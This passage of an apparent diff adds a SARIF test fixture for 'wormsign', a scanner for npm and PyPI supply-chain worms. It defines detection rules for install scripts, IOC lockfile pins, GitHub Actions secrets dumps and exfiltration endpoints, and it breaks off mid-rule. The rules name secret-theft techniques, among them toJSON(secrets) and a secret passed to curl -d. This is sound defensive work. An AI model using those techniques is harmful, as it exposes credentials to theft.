@@ -1,0 +1,1445 @@
+{
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "wormsign",
+          "version": "0.0.0-test",
+          "informationUri": "https://github.com/stgllghr/wormsign",
+          "rules": [
+            {
+              "id": "WS-LC-001",
+              "name": "install-lifecycle-script",
+              "shortDescription": {
+                "text": "package.json defines a preinstall/install/postinstall script, which runs automatically when the package is installed. Also reported for a .gyp file beside a package.json when a package manager runs node-gyp rebuild on it at install, and gyp runs the shell commands in <!(...) expansions: npm for any .gyp file with no install or preinstall script and gypfile not false, pnpm for binding.gyp with no install or preinstall script, and Yarn 1 for binding.gyp with no install script. pnpm and Yarn 1 ignore gypfile, and an empty script counts as none."
+              },
+              "fullDescription": {
+                "text": "package.json defines a preinstall/install/postinstall script, which runs automatically when the package is installed. Also reported for a .gyp file beside a package.json when a package manager runs node-gyp rebuild on it at install, and gyp runs the shell commands in <!(...) expansions: npm for any .gyp file with no install or preinstall script and gypfile not false, pnpm for binding.gyp with no install or preinstall script, and Yarn 1 for binding.gyp with no install script. pnpm and Yarn 1 ignore gypfile, and an empty script counts as none."
+              },
+              "help": {
+                "text": "Confirm the script is needed and review exactly what it runs. Installing with --ignore-scripts (or ignore-scripts=true in .npmrc) stops lifecycle scripts from running."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-lc-001",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "5.5"
+              }
+            },
+            {
+              "id": "WS-LC-002",
+              "name": "suspicious-lifecycle-script",
+              "shortDescription": {
+                "text": "A lifecycle script matches a download-and-execute, encoded-payload, or credential-harvesting pattern."
+              },
+              "fullDescription": {
+                "text": "A lifecycle script matches a download-and-execute, encoded-payload, or credential-harvesting pattern."
+              },
+              "help": {
+                "text": "Treat this as a likely compromise until reviewed: read the whole script, do not install this tree, and compare the package with its last known-good version."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-lc-002",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "WS-LC-003",
+              "name": "ioc-lifecycle-script",
+              "shortDescription": {
+                "text": "A lifecycle script references a payload filename from the sourced IOC list."
+              },
+              "fullDescription": {
+                "text": "A lifecycle script references a payload filename from the sourced IOC list."
+              },
+              "help": {
+                "text": "Treat this as a compromise: do not install, remove or replace the package, and rotate the credentials (npm, GitHub, cloud) on every machine that ran the install."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-lc-003",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "9.5"
+              }
+            },
+            {
+              "id": "WS-LC-004",
+              "name": "package-manager-runs-repo-code",
+              "shortDescription": {
+                "text": "The repository holds code a package manager runs without any lifecycle script: a .pnpmfile.cjs or .pnpmfile.mjs (pnpm runs its hooks on install), .env.yarn (Yarn 4 loads it into every script), a file under .yarn/releases or .yarn/plugins, a Plug'n'Play loader (.pnp.cjs, .pnp.loader.mjs), or a file that config names as code to run. Also reported for that config: .yarnrc.yml yarnPath, plugins or injectEnvironmentFiles; .yarnrc yarn-path; pnpm-workspace.yaml pnpmfile or globalPnpmfile; .npmrc node-options (unless it only sets a memory or stack limit or what Node.js prints), script-shell, pnpmfile or global-pnpmfile."
+              },
+              "fullDescription": {
+                "text": "The repository holds code a package manager runs without any lifecycle script: a .pnpmfile.cjs or .pnpmfile.mjs (pnpm runs its hooks on install), .env.yarn (Yarn 4 loads it into every script), a file under .yarn/releases or .yarn/plugins, a Plug'n'Play loader (.pnp.cjs, .pnp.loader.mjs), or a file that config names as code to run. Also reported for that config: .yarnrc.yml yarnPath, plugins or injectEnvironmentFiles; .yarnrc yarn-path; pnpm-workspace.yaml pnpmfile or globalPnpmfile; .npmrc node-options (unless it only sets a memory or stack limit or what Node.js prints), script-shell, pnpmfile or global-pnpmfile."
+              },
+              "help": {
+                "text": "Read the code, or what the setting runs, before running any package-manager command in this directory: a yarnPath release runs on every yarn command, before any install. If it is the project's own reviewed code (a committed Yarn release, a pnpmfile), baseline the finding: its fingerprint holds a hash of the file's content or of the settings' values, so a later change is reported again. wormsign diff reports any change to these files as WS-DF-005."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-lc-004",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-LK-001",
+              "name": "ioc-package-version",
+              "shortDescription": {
+                "text": "A lockfile pins a package@version listed as compromised in the sourced IOC list."
+              },
+              "fullDescription": {
+                "text": "A lockfile pins a package@version listed as compromised in the sourced IOC list."
+              },
+              "help": {
+                "text": "Move to a version that is not on the IOC list, regenerate the lockfile, and rotate the credentials on every machine and CI runner that installed the compromised version."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-lk-001",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "9.5"
+              }
+            },
+            {
+              "id": "WS-LK-002",
+              "name": "non-registry-resolution",
+              "shortDescription": {
+                "text": "A lockfile entry resolves from somewhere other than an allowed npm registry host."
+              },
+              "fullDescription": {
+                "text": "A lockfile entry resolves from somewhere other than an allowed npm registry host."
+              },
+              "help": {
+                "text": "Check that this source is expected. If the package should come from the registry, reinstall it from there; if the host is a trusted private registry, allow it with --registry-host."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-lk-002",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "WS-LK-003",
+              "name": "missing-integrity",
+              "shortDescription": {
+                "text": "A registry-resolved lockfile entry has no integrity hash, so tampering with the tarball would go unnoticed."
+              },
+              "fullDescription": {
+                "text": "A registry-resolved lockfile entry has no integrity hash, so tampering with the tarball would go unnoticed."
+              },
+              "help": {
+                "text": "Regenerate the lockfile with a current package manager so that every registry entry records an integrity hash."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-lk-003",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "5.5"
+              }
+            },
+            {
+              "id": "WS-GH-001",
+              "name": "ioc-workflow-file",
+              "shortDescription": {
+                "text": "A workflow file has a name from the sourced IOC list."
+              },
+              "fullDescription": {
+                "text": "A workflow file has a name from the sourced IOC list."
+              },
+              "help": {
+                "text": "Delete the workflow, treat the repository as compromised, and rotate every secret the workflow could read."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-gh-001",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "9.5"
+              }
+            },
+            {
+              "id": "WS-GH-002",
+              "name": "secrets-dump",
+              "shortDescription": {
+                "text": "A workflow expression reads the whole secrets context: toJSON(secrets), the object filter secrets.* (as in toJSON(secrets.*) or join(secrets.*, ' ')), secrets passed to any function such as format, or a secrets[...] index computed at run time; in short, any use of secrets other than secrets.NAME or secrets['NAME']. Context and function names match in any case, as GitHub reads them."
+              },
+              "fullDescription": {
+                "text": "A workflow expression reads the whole secrets context: toJSON(secrets), the object filter secrets.* (as in toJSON(secrets.*) or join(secrets.*, ' ')), secrets passed to any function such as format, or a secrets[...] index computed at run time; in short, any use of secrets other than secrets.NAME or secrets['NAME']. Context and function names match in any case, as GitHub reads them."
+              },
+              "help": {
+                "text": "Pass each step only the secrets it needs, as individual environment variables (secrets.NAME). toJSON(secrets), secrets.* and a computed secrets[...] index hand every secret available to the workflow to that step."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-gh-002",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "WS-GH-003",
+              "name": "pull-request-target-head-checkout",
+              "shortDescription": {
+                "text": "A pull_request_target or workflow_run workflow checks out code from the pull request: its head ref in a ref: value or a git fetch or checkout, written out or through an env: variable bound to it, or a ref: computed from the github context (toJSON, fromJSON or a computed index), which wormsign cannot resolve. Not followed, so not reported: a head ref passed through a step output, a file or $GITHUB_ENV."
+              },
+              "fullDescription": {
+                "text": "A pull_request_target or workflow_run workflow checks out code from the pull request: its head ref in a ref: value or a git fetch or checkout, written out or through an env: variable bound to it, or a ref: computed from the github context (toJSON, fromJSON or a computed index), which wormsign cannot resolve. Not followed, so not reported: a head ref passed through a step output, a file or $GITHUB_ENV."
+              },
+              "help": {
+                "text": "Do not run pull request code in a pull_request_target or workflow_run workflow, which can read secrets and get a write token. Use the pull_request trigger for untrusted code."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-gh-003",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "WS-GH-004",
+              "name": "self-hosted-runner",
+              "shortDescription": {
+                "text": "A workflow runs on a self-hosted runner."
+              },
+              "fullDescription": {
+                "text": "A workflow runs on a self-hosted runner."
+              },
+              "help": {
+                "text": "Use self-hosted runners only for trusted repositories, and prefer ephemeral runners so that a compromised job cannot persist on the machine."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-gh-004",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "5.5"
+              }
+            },
+            {
+              "id": "WS-GH-005",
+              "name": "secret-to-file-or-network",
+              "shortDescription": {
+                "text": "A workflow step passes a secret, directly or through an env: variable, to a command that writes a file or uses the network. Not followed, so not reported: a secret the script assigns to a shell variable and uses on a later line (T=\"${{ secrets.TOKEN }}\", then curl -d \"$T\"), or passes through a file, an action input or a step output."
+              },
+              "fullDescription": {
+                "text": "A workflow step passes a secret, directly or through an env: variable, to a command that writes a file or uses the network. Not followed, so not reported: a secret the script assigns to a shell variable and uses on a later line (T=\"${{ secrets.TOKEN }}\", then curl -d \"$T\"), or passes through a file, an action input or a step output."
+              },
+              "help": {
+                "text": "Give the secret only to the tool that needs it, through an environment variable, and do not write it to disk or send it to other hosts."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-gh-005",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "WS-GH-006",
+              "name": "ioc-runner-name",
+              "shortDescription": {
+                "text": "A workflow targets a runner name or label from the sourced IOC list."
+              },
+              "fullDescription": {
+                "text": "A workflow targets a runner name or label from the sourced IOC list."
+              },
+              "help": {
+                "text": "Take the runner and its host out of service, investigate the host as compromised, and rotate every credential it could reach."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-gh-006",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "9.5"
+              }
+            },
+            {
+              "id": "WS-GH-007",
+              "name": "discussion-trigger-with-run",
+              "shortDescription": {
+                "text": "A workflow is triggered by discussion events and runs shell commands (used as a remote-command backdoor by a reported variant)."
+              },
+              "fullDescription": {
+                "text": "A workflow is triggered by discussion events and runs shell commands (used as a remote-command backdoor by a reported variant)."
+              },
+              "help": {
+                "text": "Remove the discussion trigger or the run steps. Discussion events can come from users without write access and should not drive shell commands."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-gh-007",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "WS-FS-001",
+              "name": "ioc-payload-hash",
+              "shortDescription": {
+                "text": "A file's SHA-256 matches a payload hash from the sourced IOC list."
+              },
+              "fullDescription": {
+                "text": "A file's SHA-256 matches a payload hash from the sourced IOC list."
+              },
+              "help": {
+                "text": "Treat this as a compromise: delete the file and rotate the credentials (npm, GitHub, cloud) on every machine where it ran."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-fs-001",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "9.5"
+              }
+            },
+            {
+              "id": "WS-FS-002",
+              "name": "payload-filename",
+              "shortDescription": {
+                "text": "A file has a name associated with worm payloads in the sourced IOC list."
+              },
+              "fullDescription": {
+                "text": "A file has a name associated with worm payloads in the sourced IOC list."
+              },
+              "help": {
+                "text": "Inspect the file. A name match is weaker evidence than a hash match; if the file is not expected, treat it as a compromise."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-fs-002",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-EX-001",
+              "name": "exfil-endpoint",
+              "shortDescription": {
+                "text": "A file contains a hardcoded webhook, paste, or request-capture endpoint."
+              },
+              "fullDescription": {
+                "text": "A file contains a hardcoded webhook, paste, or request-capture endpoint."
+              },
+              "help": {
+                "text": "Confirm that the endpoint is expected. Code that sends data to webhook, paste or request-capture services is a common exfiltration channel."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-ex-001",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "5.5"
+              }
+            },
+            {
+              "id": "WS-EX-002",
+              "name": "ioc-exfil-endpoint",
+              "shortDescription": {
+                "text": "A file contains an exfiltration endpoint from the sourced IOC list."
+              },
+              "fullDescription": {
+                "text": "A file contains an exfiltration endpoint from the sourced IOC list."
+              },
+              "help": {
+                "text": "Treat this as a compromise: remove the code and rotate every credential it could have read."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-ex-002",
+              "properties": {
+                "tags": [
+                  "security"
+                ],
+                "security-severity": "9.5"
+              }
+            },
+            {
+              "id": "WS-NM-001",
+              "name": "installed-package-install-script",
+              "shortDescription": {
+                "text": "An installed package in node_modules declares an install-time script."
+              },
+              "fullDescription": {
+                "text": "An installed package in node_modules declares an install-time script."
+              },
+              "help": {
+                "text": "Review the package's install script. Installing with --ignore-scripts stops install scripts from running."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-nm-001",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-DF-001",
+              "name": "new-dependency-install-script",
+              "shortDescription": {
+                "text": "A pull request adds a dependency that runs install-time scripts, including a local package (a workspace or file: directory) that an npm lockfile records with install scripts."
+              },
+              "fullDescription": {
+                "text": "A pull request adds a dependency that runs install-time scripts, including a local package (a workspace or file: directory) that an npm lockfile records with install scripts."
+              },
+              "help": {
+                "text": "Review the new dependency and its install script before merging. Install scripts run on every machine and CI runner that installs the project. A reviewed one gets through today in one of two ways: the owner of the required check overrides it for this pull request, or a pull request that baselines the finding lands first, which itself fails WS-DF-005 and needs the same override. A narrower route, an opt-in code-owner approval of the baseline change, is accepted but not yet built (docs/adr/0008-baseline-approval-route.md)."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-df-001",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-DF-002",
+              "name": "lifecycle-script-changed",
+              "shortDescription": {
+                "text": "A pull request adds or changes a lifecycle script that an install runs, or a .gyp file beside a package.json, for which npm, pnpm or Yarn 1 can run node-gyp rebuild. Also reported for an unchanged .gyp file when the change adds the package.json beside it, or removes or empties its install script, preinstall script or gypfile: false, so that npm, pnpm or Yarn 1 starts running node-gyp on it. pnpm and Yarn 1 run binding.gyp even with gypfile: false, so a package.json added with gypfile: false is reported too."
+              },
+              "fullDescription": {
+                "text": "A pull request adds or changes a lifecycle script that an install runs, or a .gyp file beside a package.json, for which npm, pnpm or Yarn 1 can run node-gyp rebuild. Also reported for an unchanged .gyp file when the change adds the package.json beside it, or removes or empties its install script, preinstall script or gypfile: false, so that npm, pnpm or Yarn 1 starts running node-gyp on it. pnpm and Yarn 1 run binding.gyp even with gypfile: false, so a package.json added with gypfile: false is reported too."
+              },
+              "help": {
+                "text": "Review the lifecycle script change before merging. It runs automatically on install."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-df-002",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-DF-003",
+              "name": "workflow-changed",
+              "shortDescription": {
+                "text": "A pull request adds or changes a GitHub Actions workflow."
+              },
+              "fullDescription": {
+                "text": "A pull request adds or changes a GitHub Actions workflow."
+              },
+              "help": {
+                "text": "Review the workflow change before merging. Workflows on the default branch can read repository secrets."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-df-003",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-DF-004",
+              "name": "dependency-install-script-added",
+              "shortDescription": {
+                "text": "A pull request changes a dependency's version to one that now has install scripts."
+              },
+              "fullDescription": {
+                "text": "A pull request changes a dependency's version to one that now has install scripts."
+              },
+              "help": {
+                "text": "Review the new version's install script before merging and compare the version with the previous one."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-df-004",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-DF-005",
+              "name": "install-policy-changed",
+              "shortDescription": {
+                "text": "A pull request adds, changes or removes what controls installs or what wormsign reports: package-manager config (.npmrc, .yarnrc, .yarnrc.yml, pnpm-workspace.yaml, .pnpmfile.cjs, bunfig.toml, pip.conf, pip.ini, uv.toml, a pyproject.toml's [tool.uv] install settings), code that config runs, the build of a Python project no uv.lock or pylock.toml lists (what decides its build requirements, which an install that builds it resolves fresh: [build-system], setup.cfg, setup.py, hatch.toml, hook files), the packageManager field, the workspaces field, a dependency spec that installs from a local path, or the wormsign baseline; or it removes a lockfile (npm's, a Python lock, or a requirements file holding hashes), or strips a requirements file of its hashes (one found by name, or by its --hash options as soak finds one: deps.txt, deps.lock.in)."
+              },
+              "fullDescription": {
+                "text": "A pull request adds, changes or removes what controls installs or what wormsign reports: package-manager config (.npmrc, .yarnrc, .yarnrc.yml, pnpm-workspace.yaml, .pnpmfile.cjs, bunfig.toml, pip.conf, pip.ini, uv.toml, a pyproject.toml's [tool.uv] install settings), code that config runs, the build of a Python project no uv.lock or pylock.toml lists (what decides its build requirements, which an install that builds it resolves fresh: [build-system], setup.cfg, setup.py, hatch.toml, hook files), the packageManager field, the workspaces field, a dependency spec that installs from a local path, or the wormsign baseline; or it removes a lockfile (npm's, a Python lock, or a requirements file holding hashes), or strips a requirements file of its hashes (one found by name, or by its --hash options as soak finds one: deps.txt, deps.lock.in)."
+              },
+              "help": {
+                "text": "Review the change to the policy file itself. A change that weakens a release-age setting, re-enables install scripts or adds a baseline entry can silence the other checks for this pull request."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-df-005",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-DF-006",
+              "name": "changed-file-not-checked",
+              "shortDescription": {
+                "text": "A pull request changes a manifest or lockfile that wormsign could not read or parse, or a bun lockfile, which wormsign does not parse, so nothing in it was checked. Also reported on every run for a .yarnrc.yml or pnpm-workspace.yaml with anything outside the YAML subset wormsign reads, since the code it names could not be followed. A changed Python lockfile or requirements file, and any change to a pyproject.toml, setup.py, setup.cfg or Pipfile, is reported at medium: diff does not check what they pin or declare, and soak --base checks the locks."
+              },
+              "fullDescription": {
+                "text": "A pull request changes a manifest or lockfile that wormsign could not read or parse, or a bun lockfile, which wormsign does not parse, so nothing in it was checked. Also reported on every run for a .yarnrc.yml or pnpm-workspace.yaml with anything outside the YAML subset wormsign reads, since the code it names could not be followed. A changed Python lockfile or requirements file, and any change to a pyproject.toml, setup.py, setup.cfg or Pipfile, is reported at medium: diff does not check what they pin or declare, and soak --base checks the locks."
+              },
+              "help": {
+                "text": "Fix the file so it parses, or review its changes by hand. The finding fails closed because the package manager may still act on the file. For a Python lockfile, requirements file or manifest, run `wormsign soak --base <base>` on the change, which checks what the locks pin."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-df-006",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-SK-001",
+              "name": "package-too-new",
+              "shortDescription": {
+                "text": "A locked package version was published less than the required soak time ago."
+              },
+              "fullDescription": {
+                "text": "A locked package version was published less than the required soak time ago."
+              },
+              "help": {
+                "text": "Pin the previous version, or wait until this version has been published for the required soak time. In PR mode (--base) an npm or Python entry the base's own soak read identically (the same lock file, name, version and hashes) is not checked again, so a young version pushed directly to the base passes later pull requests: the full soak on push and on a schedule catches it. A pin that lands first in a file the base's soak never read as a lock is checked once a change makes it one."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-sk-001",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-SK-002",
+              "name": "soak-unverifiable",
+              "shortDescription": {
+                "text": "The publish time or identity of a locked package version could not be verified; treated as failing (fail closed). npm, pnpm, Yarn and bun: a missing, unreadable or unsupported lockfile, a git or off-registry source, a private registry, a version not on the registry, an integrity that differs from the registry's, or a registry error. PyPI: a lockfile soak does not read yet (poetry.lock, pdm.lock, Pipfile.lock), a manifest or PEP 723 script that no lock covers, a requirements file that is not a complete --require-hashes lock, a locked file without a sha256 or that is not a file of that project and version on the index (deleted, quarantined or never published), a git, URL or other-index source, a local source that is not in the reviewed tree, an install setting that may use another index or skip hash checks, or an index error."
+              },
+              "fullDescription": {
+                "text": "The publish time or identity of a locked package version could not be verified; treated as failing (fail closed). npm, pnpm, Yarn and bun: a missing, unreadable or unsupported lockfile, a git or off-registry source, a private registry, a version not on the registry, an integrity that differs from the registry's, or a registry error. PyPI: a lockfile soak does not read yet (poetry.lock, pdm.lock, Pipfile.lock), a manifest or PEP 723 script that no lock covers, a requirements file that is not a complete --require-hashes lock, a locked file without a sha256 or that is not a file of that project and version on the index (deleted, quarantined or never published), a git, URL or other-index source, a local source that is not in the reviewed tree, an install setting that may use another index or skip hash checks, or an index error."
+              },
+              "help": {
+                "text": "Fix what the finding names (commit the lockfile, install from the registry, or make the registry reachable with --registry or --pypi-index) and run the check again. For Python, lock with uv (uv lock), or write a hash lock (uv pip compile --generate-hashes, with --require-hashes in the file), and install with --locked, --frozen or --require-hashes. The gate fails closed when it cannot verify a package. Of the requirements-file problems, a baseline can approve only a plain index requirement soak parsed to the end and a local file it resolved to a regular file inside the repository; any other (an option, an include, a path soak cannot pin, a line it could not read, a halt, the missing --require-hashes line) is never suppressed: fix the line as its message says."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-sk-002",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-SK-003",
+              "name": "soak-config-missing",
+              "shortDescription": {
+                "text": "No package-manager release-age setting enforcing the soak time was found in project configuration."
+              },
+              "fullDescription": {
+                "text": "No package-manager release-age setting enforcing the soak time was found in project configuration."
+              },
+              "help": {
+                "text": "Add the release-age setting the finding names for this package manager. Where none exists (Yarn Classic), run `wormsign soak` in CI as the gate."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-sk-003",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-SK-004",
+              "name": "soak-config-too-short",
+              "shortDescription": {
+                "text": "A package-manager release-age setting is shorter than required, cannot be interpreted, is ignored by the package-manager version that will run (or that version is unknown), or is bypassed by an exclusion or trust setting."
+              },
+              "fullDescription": {
+                "text": "A package-manager release-age setting is shorter than required, cannot be interpreted, is ignored by the package-manager version that will run (or that version is unknown), or is bypassed by an exclusion or trust setting."
+              },
+              "help": {
+                "text": "Fix what the finding names: set the value to at least the required soak time, run a package-manager version that enforces it, or remove the setting that bypasses it. For Yarn, write plain minutes: Yarn 4.10 reads a unit suffix as minutes (\"7d\" is 7 minutes), while 4.11 and later accept suffixes."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-sk-004",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-SK-005",
+              "name": "install-time-resolution",
+              "shortDescription": {
+                "text": "A Python install builds a package from source, and the build's requirements are resolved when it runs, outside every lockfile soak reads: a local project the install builds (a uv directory or editable member, a pylock directory entry), a package locked only as an sdist, or uv configuration in the tree that forces source builds (no-binary, no-build-isolation, extra-build-dependencies, config-settings). soak never locks, binds or ages build requirements."
+              },
+              "fullDescription": {
+                "text": "A Python install builds a package from source, and the build's requirements are resolved when it runs, outside every lockfile soak reads: a local project the install builds (a uv directory or editable member, a pylock directory entry), a package locked only as an sdist, or uv configuration in the tree that forces source builds (no-binary, no-build-isolation, extra-build-dependencies, config-settings). soak never locks, binds or ages build requirements."
+              },
+              "help": {
+                "text": "Avoid the build where you can: `uv sync --locked --no-install-project` or `[tool.uv] package = false` for a project that need not be installed, a version with wheels for the platforms you install on, no build-forcing settings. Otherwise pin the build requirements with ==-pinned build constraints (uv build-constraint-dependencies, pip --build-constraint) and keep the installer's release-age cutoff, which is all that protects them. A reviewed local build can be baselined with a justification: its key changes when its build requirements or build files do. In PR mode (--base) a build the change adds is high, so the default --fail-on high stops it; one the base already had stays medium."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-sk-005",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-SK-006",
+              "name": "soak-outage-unverified",
+              "shortDescription": {
+                "text": "Reported only with --on-outage warn: a locked package version was not checked because the npm registry or the Python index was out for the whole run. Its request failed after soak's retry in transport before any status line (a DNS or connection error, a TLS handshake that broke off, a timeout) or with HTTP 429 or a 5xx; the host gave no other answer in the run; and a HEAD probe of its root after the run got none either. Its age, identity and OSV records are unverified. Without the option the same package is WS-SK-002, high, and so it stays under the option when the host answered anything, including a host that went down mid-run, and for every other problem: HTTP 404 or another 4xx, a redirect, a body that is slow, cut off or does not parse, a certificate the client rejects, an integrity mismatch, a private registry or a name wormsign cannot vouch for."
+              },
+              "fullDescription": {
+                "text": "Reported only with --on-outage warn: a locked package version was not checked because the npm registry or the Python index was out for the whole run. Its request failed after soak's retry in transport before any status line (a DNS or connection error, a TLS handshake that broke off, a timeout) or with HTTP 429 or a 5xx; the host gave no other answer in the run; and a HEAD probe of its root after the run got none either. Its age, identity and OSV records are unverified. Without the option the same package is WS-SK-002, high, and so it stays under the option when the host answered anything, including a host that went down mid-run, and for every other problem: HTTP 404 or another 4xx, a redirect, a body that is slow, cut off or does not parse, a certificate the client rejects, an integrity mismatch, a private registry or a name wormsign cannot vouch for."
+              },
+              "help": {
+                "text": "The trade-off: under --on-outage warn an outage of the whole configured host no longer fails the gate at the default --fail-on high, so whoever can make that host unreachable from the runner for the entire run (an outage, a firewall rule, an attacker on the network path) can merge a change whose packages were never checked, recorded only by this finding and the run's UNVERIFIED line. One name the registry will not serve is not enough: it stays WS-SK-002. Choose the option only where a gate that teams switch off is the worse risk, and run soak again once the host answers, before anything installs the change. A baseline never suppresses this finding: an outage is transient, and an entry for it would waive the next one."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-sk-006",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-OR-001",
+              "name": "org-ioc-repo",
+              "shortDescription": {
+                "text": "A repository name or description matches a worm indicator pattern."
+              },
+              "fullDescription": {
+                "text": "A repository name or description matches a worm indicator pattern."
+              },
+              "help": {
+                "text": "Inspect the repository. If it was created by the worm, preserve evidence, make it private or delete it, and rotate the credentials it exposes."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-or-001",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-OR-002",
+              "name": "org-visibility-flip",
+              "shortDescription": {
+                "text": "Audit log shows a repository changed from private to public."
+              },
+              "fullDescription": {
+                "text": "Audit log shows a repository changed from private to public."
+              },
+              "help": {
+                "text": "Confirm that the change was intended. If not, make the repository private again and find out who made the change."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-or-002",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-OR-003",
+              "name": "org-runner",
+              "shortDescription": {
+                "text": "A self-hosted runner registered on the organization or one of its repositories needs review."
+              },
+              "fullDescription": {
+                "text": "A self-hosted runner registered on the organization or one of its repositories needs review."
+              },
+              "help": {
+                "text": "Confirm that the runner is expected and that only trusted repositories can use it. Remove a runner with a worm IOC name and investigate its host."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-or-003",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-OR-004",
+              "name": "org-ioc-workflow",
+              "shortDescription": {
+                "text": "A repository contains a workflow file or branch whose name is in the sourced IOC list."
+              },
+              "fullDescription": {
+                "text": "A repository contains a workflow file or branch whose name is in the sourced IOC list."
+              },
+              "help": {
+                "text": "Delete the workflow file or branch, treat the repository as compromised, and rotate every secret the workflow could read."
+              },
+              "helpUri": "https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#ws-or-004",
+              "properties": {
+                "tags": [
+                  "security"
+                ]
+              }
+            },
+            {
+              "id": "WS-OR-900",
+              "name": "org-audit-degraded",
+              "shortDescription": {
